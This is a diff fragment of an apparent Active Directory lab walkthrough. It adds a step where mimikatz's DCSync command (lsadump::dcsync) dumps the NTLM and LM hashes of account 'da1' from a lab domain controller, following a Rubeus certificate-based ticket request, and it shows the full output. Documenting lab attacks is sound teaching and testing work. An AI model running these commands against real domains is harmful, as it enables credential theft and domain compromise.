@@ -715,8 +715,34 @@ C:\Users\g.white\Desktop\Tools>Rubeus.exe asktgt /user:da1 /certificate:C:\Users
 C:\Users\g.white\Desktop\Tools>
 ```
 
+**You can then use mimikatz to dump the NTLM hash, you do not need to execute mimikatz with admin privileges.**
 
+```
+mimikatz # lsadump::dcsync /dc:WIN-8HPLF8PSHC1.hacklab.local /domain:hacklab.local /user:da1
+[DC] 'hacklab.local' will be the domain
+[DC] 'WIN-8HPLF8PSHC1.hacklab.local' will be the DC server
+[DC] 'da1' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
+Object RDN           : da1
+
+** SAM ACCOUNT **
+
+SAM Username         : da1
+User Principal Name  : da1@hacklab.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 15/04/2024 12:37:12
+Object Security ID   : S-1-5-21-2199964591-1196550447-1073987862-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
+    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
+    lm  - 0: 1037af637604d47c1309c0d208172545
+```
 
 
 **Using Certify errors**
